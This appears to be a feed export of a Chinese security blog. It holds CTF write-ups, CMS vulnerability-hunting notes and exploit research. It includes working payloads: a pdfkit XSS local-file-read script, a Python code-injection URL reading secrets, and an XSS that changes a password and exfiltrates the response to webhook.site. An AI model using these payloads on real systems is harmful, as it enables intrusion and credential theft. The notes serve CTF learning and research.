class="params">name</span>):</span><br><span class="line">    charset = string.ascii_letters + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            flash(<span class="string">&quot;Invalid Name&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>限制<code>name</code> 没啥意思</p><p>目前的思路</p><ol><li>估计是要读文件搞到 <code>admin_hash</code>  SSTI之类的</li><li>想办法污染<code>is_admin</code> 参数</li></ol><p>这里有个奇怪的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_certificate</span>(<span class="params">name, email, course, author</span>):</span><br><span class="line">    date = time.strftime(<span class="string">&#x27;%d, %b, %Y&#x27;</span>, time.localtime())</span><br><span class="line">    html = template.<span class="built_in">format</span>(name, email, course, author, date)</span><br><span class="line">    options = &#123;<span class="string">&#x27;orientation&#x27;</span>: <span class="string">&#x27;landscape&#x27;</span>, <span class="string">&#x27;page-size&#x27;</span>: <span class="string">&#x27;B6&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># Cool! HTML to PDF</span></span><br><span class="line">    pdf = pdfkit.from_string(html, options=options)</span><br><span class="line">    <span class="keyword">return</span> pdf</span><br></pre></td></tr></table></figure><p>然后我们看到  <code>from_string</code> 里的 html 参数可控</p><p>可以看一下我们到底能控制哪几个？</p><p>然后发现只有 <code>name</code>,<code>email</code> 可控</p><p>然后看看有哪些过滤</p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220824011132772.png" alt="image-20220824011132772" style="zoom:50%;"><p>然后发现有个  看看这两个过滤会不会出啥问题</p><p>然后发现这个email后面可以加任意的东西</p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220824011901839.png" alt="image-20220824011901839" style="zoom:50%;"><p>所以 我想看一下 这里能不能利用一下</p><p>先查一下这个函数 <a href="https://pypi.org/project/pdfkit/">https://pypi.org/project/pdfkit/</a></p><p>跟一下 文档说的也不是很清楚 看看有没有啥读文件功能之类的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ses = requests.session()</span><br><span class="line">ses.proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;10.0.20.1:8080&#x27;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&#x27;http://onlineeducation.sstf.site&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;script&gt;</span></span><br><span class="line"><span class="string">function qwq()&#123;</span></span><br><span class="line"><span class="string">  document.write(this.responseText); </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var r = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">r.addEventListener(&quot;load&quot;, qwq);</span></span><br><span class="line"><span class="string">r.open(&quot;GET&quot;, &quot;file:///home/app/config.py&quot;);</span></span><br><span class="line"><span class="string">r.send()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/signin&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;qwq&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;qwq@qq.com&#x27;</span>+payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/status&#x27;</span>, json=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;start&#x27;</span>&#125;)</span><br><span class="line">    ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/status&#x27;</span>, json=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;finish&#x27;</span>, <span class="string">&#x27;rate&#x27;</span>: -<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">req = ses.get(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/cert&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.pdf&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(req.content)</span><br></pre></td></tr></table></figure><p>然后可以读本地文件</p><h2 id="Imageium"><a href="#Imageium" class="headerlink" title="Imageium"></a>Imageium</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//imag</span>eium.sstf.site/dynamic/modified?mode=__import_<span class="number">_</span>(%27os%27).popen(%27cat%20secret/*%27).read()</span><br></pre></td></tr></table></figure><h2 id="Datascience-Class"><a href="#Datascience-Class" class="headerlink" title="Datascience Class"></a>Datascience Class</h2><p><a href="https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-datascience-class">https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-datascience-class</a></p><blockquote><p>不過就在我做到這邊的時候 seadog007 就已經用 <a href="https://github.com/DominicBreuker/pspy">pspy</a> 從其他隊伍那邊偷到 flag 了 XDDD，所以就沒繼續做下去。</p></blockquote><p>学到了 这tm是真的nb  orzzzzzzzzzzzzzzzzz</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220824020113565.png" alt="image-20220824020113565"></p><p>可以直接执行xss</p><p>大佬的payload  bot下线了好像 这样可以直接打  maple yyds</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%html</span><br><span class="line">&lt;select&gt;&lt;iframe&gt;&lt;/select&gt;&lt;img src=x: onerror=<span class="string">&quot;fetch(&#x27;/hub/change-password&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;password=NEWPASSWORD&#x27;&#125;).then(r=&gt;r.text()).catch(err=&gt;err.message).then(t=&gt;fetch(&#x27;https://webhook.site/9ba401b3-763f-4926-870e-0174490b91aa&#x27;,&#123;method:&#x27;POST&#x27;,body:t&#125;))</span></span><br><span class="line"><span class="string">&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="OnlineNotepad"><a href="#OnlineNotepad" class="headerlink" title="OnlineNotepad"></a>OnlineNotepad</h2><blockquote><p>Online Notepad is a free notepad! Please read the admin’s memo.</p></blockquote><p>有点累了 直接看wp了 不想复现了</p><p><a href="https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-onlinenotepad">https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-onlinenotepad</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>读源码时要更认真 深入</li><li>xss有点生疏了 要常做</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;貌似可以传一个数组过去 然后去读文件？好像不太行&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>IOT-DVFR</title>
    <link href="http://example.com/2022/08/22/IOT-DVFR/"/>
    <id>http://example.com/2022/08/22/IOT-DVFR/</id>
    <published>2022-08-21T19:16:10.000Z</published>
    <updated>2022-08-23T19:06:12.295Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/184718">https://www.anquanke.com/post/id/184718</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/184718&quot;&gt;https://www.anquanke.com/post/id/184718&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="IOT" scheme="http://example.com/categories/IOT/"/>
    
    
    <category term="IOT" scheme="http://example.com/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>IOT-3</title>
    <link href="http://example.com/2022/08/22/IOT-3/"/>
    <id>http://example.com/2022/08/22/IOT-3/</id>
    <published>2022-08-21T18:54:17.000Z</published>
    <updated>2022-08-23T19:06:46.628Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
</summary>
      
    
    
    
    <category term="IOT" scheme="http://example.com/categories/IOT/"/>
    
    
    <category term="IOT" scheme="http://example.com/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>webshell检测相关知识学习</title>
    <link href="http://example.com/2022/08/21/webshell%E6%A3%80%E6%B5%8B/"/>
    <id>http://example.com/2022/08/21/webshell%E6%A3%80%E6%B5%8B/</id>
    <published>2022-08-21T05:43:13.000Z</published>
    <updated>2022-08-23T19:07:56.005Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3f771aff0b6f3e445a3f3b4787752e327d4d61e4e010448edeedccc47761856b">543d0914c471b16151bb976d882250c17c286a96accd3064f9adf364de1f7a7ff85407ba240e2a80cc43ebf75a409aeaa689a889b60035344727728a9ce6e782</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="webshell" scheme="http://example.com/categories/webshell/"/>
    
    
    <category term="webshell" scheme="http://example.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>Java内存马</title>
    <link href="http://example.com/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-08-20T18:23:22.000Z</published>
    <updated>2022-08-23T19:08:23.221Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="92c14c3d0351ef07242d55226f086409e7babcbce74c78676c8f33ffbf3c5664">21f8e907b6ea59635716f91a3e5cdbabd1743799ee190c459ac22dcf9df5181a9810b4b9b155c413a2a82313f5cd588f3c95d204dd40dcacf86f531d88d5c53e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
    <category term="Java内存马" scheme="http://example.com/tags/Java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2022 writeup</title>
    <link href="http://example.com/2022/08/20/WMCTF2022/"/>
    <id>http://example.com/2022/08/20/WMCTF2022/</id>
    <published>2022-08-20T06:32:38.000Z</published>
    <updated>2022-08-23T19:07:07.229Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c187c277707469cbb5f91626fb284f679cf36c96e123c4afe24a6a36abe7bebf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>国微school</title>
    <link href="http://example.com/2022/08/20/%E5%9B%BD%E5%BE%AEschool/"/>
    <id>http://example.com/2022/08/20/%E5%9B%BD%E5%BE%AEschool/</id>
    <published>2022-08-19T19:18:18.000Z</published>
    <updated>2022-08-23T19:08:52.270Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>admin admin888</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;admin admin888&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="cms" scheme="http://example.com/tags/cms/"/>
    
    <category term="bug hunter" scheme="http://example.com/tags/bug-hunter/"/>
    
  </entry>
  
  <entry>
    <title>SchoolCMS漏洞挖掘</title>
    <link href="http://example.com/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://example.com/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2022-08-19T14:21:18.000Z</published>
    <updated>2022-08-19T19:10:54.876Z</updated>
    
    <content type="html"><![CDATA[<p>开挖开挖！！！</p><span id="more"></span><p>今天看了P神的一篇文章 很有启发 我以后也要这样挖洞 虽然我挖的都是垃圾洞</p><h1 id="0x01-代码通读与逻辑梳理"><a href="#0x01-代码通读与逻辑梳理" class="headerlink" title="0x01 代码通读与逻辑梳理"></a>0x01 代码通读与逻辑梳理</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">schoolcms</span><br><span class="line">├─core.php        入口公共文件</span><br><span class="line">├─<span class="keyword">index</span>.php       前台入口文件</span><br><span class="line">├─<span class="keyword">admin</span>.php       后台入口文件</span><br><span class="line">├─README.md       README文件</span><br><span class="line">├─robots.txt      爬虫规则定义文件</span><br><span class="line">├─composer.json   Composer定义文件</span><br><span class="line">├─changelog.txt   更新日志</span><br><span class="line">├─Application     应用目录</span><br><span class="line">│  ├─<span class="keyword">Admin</span>        后台目录</span><br><span class="line">│  │  ├─Common       应用函数目录</span><br><span class="line">│  │  ├─Conf         应用配置目录</span><br><span class="line">│  │  ├─Lang         应用语言包目录</span><br><span class="line">│  │  ├─Controller   应用控制器目录</span><br><span class="line">│  │  ├─Model        应用模型目录</span><br><span class="line">│  │  └─<span class="keyword">View</span>         应用视图目录</span><br><span class="line">│  │     └─<span class="keyword">Default</span>       默认模板目录</span><br><span class="line">│  ├─Home         前台目录</span><br><span class="line">│  │  ├─Common       应用函数目录</span><br><span class="line">│  │  ├─Conf         应用配置目录</span><br><span class="line">│  │  ├─Lang         应用语言包目录</span><br><span class="line">│  │  ├─Controller   应用控制器目录</span><br><span class="line">│  │  ├─Model        应用模型目录</span><br><span class="line">│  │  └─<span class="keyword">View</span>         应用视图目录</span><br><span class="line">│  │     └─<span class="keyword">Default</span>       默认模板目录</span><br><span class="line">│  ├─Common       公共函数配置目录</span><br><span class="line">│  │  ├─Common       公共方法目录</span><br><span class="line">│  │  └─Conf         公共配置目录</span><br><span class="line">│  └─Runtime      临时文件目录</span><br><span class="line">├─<span class="built_in">Public</span>          资源文件目录</span><br><span class="line">│  ├─<span class="keyword">Admin</span>        后台静态资源目录</span><br><span class="line">│  │  └─<span class="keyword">Default</span>       默认模板目录</span><br><span class="line">│  ├─Home         前台静态资源目录</span><br><span class="line">│  │  └─<span class="keyword">Default</span>       默认模板目录</span><br><span class="line">│  ├─Common       公共静态资源目录</span><br><span class="line">│  └─Upload       用户上传附件资源目录</span><br><span class="line">├─Install         安装引导目录</span><br><span class="line">└─ThinkPHP        框架目录</span><br></pre></td></tr></table></figure><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220819222453710.png" alt="image-20220819222453710"></p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220819225905186.png" alt="image-20220819225905186"></p><p>现代PHP项目想要getshell，常见的方法有下面几个：</p><ul><li>文件上传漏洞</li><li>路由错误导致的函数执行漏洞，比如ThinkPHP 5的两个RCE</li><li>模板注入漏洞，比如Cachet这个<a href="https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html">后台getshell</a></li><li>反序列化漏洞</li></ul><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传点1 主题</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220819232551729.png" alt="image-20220819232551729"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span> = <span class="keyword">array</span>(<span class="string">&#x27;application/zip&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>);</span><br></pre></td></tr></table></figure><p>文件类型必须是这两种 改一下就可以绕过了</p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source\_posts\SchoolCMS漏洞挖掘\image-20220820000814156.png" alt="image-20220820000814156" style="zoom:50%;"><p>然后我们来看一下 进行写入的条件</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820002421222.png" alt="image-20220820002421222"></p><p>直接构造就好 很容易绕过 。。。 但是被交了 。。。 服了 </p><p>上传点2 logo 这里也被交了。。。</p><p><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201902-949">国家信息安全漏洞库 (cnnvd.org.cn)</a></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820011535237.png" alt="image-20220820011535237"></p><p>可惜参数不可控 看了几个 都是后台的sql注入 我也不屑于去挖了</p><p>把关注点放在普通用户的注入上</p><p>来分析一下 thinkphp3 sql注入形成的原因？okk</p><p>先来看<code>find</code>函数</p><p>然后调用 <code>select</code></p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source\_posts\SchoolCMS漏洞挖掘\image-20220820015600605.png" alt="image-20220820015600605" style="zoom:50%;"><p>跟过去</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820015944174.png" alt="image-20220820015944174"></p><p><code>$this-&gt;buildSelectSql()</code></p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820020048808.png" alt="image-20220820020048808"></p><p><a href="http://www.hackdig.com/02/hack-596623.htm">http://www.hackdig.com/02/hack-596623.htm</a></p><h2 id="缓存漏洞是否能实现"><a href="#缓存漏洞是否能实现" class="headerlink" title="缓存漏洞是否能实现"></a>缓存漏洞是否能实现</h2><p>看了眼生成的缓存文件 发现都这样</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220819230206526.png" alt="image-20220819230206526"></p><p>说明 已经被过滤啦</p><p>还是去跟一下 看看是怎么被过滤的</p><h2 id="assign导致的命令执行"><a href="#assign导致的命令执行" class="headerlink" title="assign导致的命令执行"></a>assign导致的命令执行</h2><p>好不容易找到一个可控的assign 结果可控的是第二个参数 吐了。。。</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820023628894.png" alt="image-20220820023628894"></p><p>我们可以输入一个数组进去 试试看</p><p>没有找到第一个参数可控的。。。失败</p><p>首先要写入攻击代码到日志中，错误请求系统报错</p><p>他这里给他urlencode 十分恶心。。不知道后面能不能解析回来。。。</p><p>这里是<code>controller.class</code>中的 assign 又调用了 <code>view.class</code>中的 assign</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820025435857.png" alt="image-20220820025435857"></p><p>可控变量进入assign方法赋值给$this→tVar变量</p><p><img src="/2022/08/19/SchoolCMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/MyBlog\b1ue0cean.github.io\source_posts\SchoolCMS漏洞挖掘\image-20220820025359956.png" alt="image-20220820025359956"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开挖开挖！！！&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>命令执行回显研究</title>
    <link href="http://example.com/2022/08/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E7%A0%94%E7%A9%B6/"/>
    <id>http://example.com/2022/08/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E7%A0%94%E7%A9%B6/</id>
    <published>2022-08-18T12:11:48.000Z</published>
    <updated>2022-08-23T19:10:42.264Z</updated>
    
    <content type="html"><![CDATA[<p>在探索一下不出网的命令执行回显方式是的总结与思考</p><span id="more"></span><h2 id="curl的两种简单用法"><a href="#curl的两种简单用法" class="headerlink" title="curl的两种简单用法"></a>curl的两种简单用法</h2><p>首先来读一下一篇文章</p><p><a href="https://www.anquanke.com/post/id/98896">https://www.anquanke.com/post/id/98896</a></p><p>读完后你应该明白的几件事</p><ul><li>curl 支持file协议</li></ul><img src="/2022/08/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E7%A0%94%E7%A9%B6/MyBlog\b1ue0cean.github.io\source\_posts\命令执行回显研究\image-20220818213021329.png" alt="image-20220818213021329" style="zoom:50%;"><ul><li><p>curl 可以用来写文件 <code>-o/--output &lt;file&gt; 指定输出文件名称</code>  前提是出网</p><img src="/2022/08/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E7%A0%94%E7%A9%B6/MyBlog\b1ue0cean.github.io\source\_posts\命令执行回显研究\image-20220818213258519.png" alt="image-20220818213258519" style="zoom: 33%;"></li></ul><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台 - 00theway | blog | hacker | exp | exploit | security</a></p><blockquote><p>经过一段时间的研究发现了一种新的通杀的回显思路。在LINUX环境下，可以通过文件描述符”/proc/self/fd/i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;FileDescriptor&gt; c= <span class="module-access"><span class="module"><span class="identifier">FileDescriptor</span>.</span></span><span class="keyword">class</span>.get<span class="constructor">DeclaredConstructor(<span class="params">new</span> Class[]&#123;Integer.TYPE&#125;)</span>;</span><br><span class="line">c.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line">String ret = <span class="string">&quot;00theway&quot;</span>;</span><br><span class="line">FileOutputStream os = <span class="keyword">new</span> <span class="constructor">FileOutputStream(<span class="params">c</span>.<span class="params">newInstance</span>(<span class="params">new</span> Integer(4)</span>));</span><br><span class="line">os.write(ret.get<span class="constructor">Bytes()</span>);</span><br><span class="line">os.close<span class="literal">()</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在探索一下不出网的命令执行回显方式是的总结与思考&lt;/p&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
    <category term="misc" scheme="http://example.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.24反序列化漏洞</title>
    <link href="http://example.com/2022/08/18/thinkphp5-x/"/>
    <id>http://example.com/2022/08/18/thinkphp5-x/</id>
    <published>2022-08-18T08:00:15.000Z</published>
    <updated>2022-08-23T19:11:02.269Z</updated>
    
    <content type="html"><![CDATA[<p>开始搞起来（没写完</p><span id="more"></span><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>windows10  phpstudy  php7.3.4</p><p>和平常一样 加上这个 <code>.htaccess</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;IfModule mod_rewrite.c&gt;</span></span><br><span class="line">  <span class="attribute">Options</span> +FollowSymlinks -Multiviews</span><br><span class="line">  <span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> !-d</span><br><span class="line">  <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> !-f</span><br><span class="line">  <span class="attribute">RewriteRule</span> ^(.*)$ index.php?/$<span class="number">1</span><span class="meta"> [QSA,PT,L]</span></span><br><span class="line"><span class="comment">#    RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</span></span><br><span class="line"><span 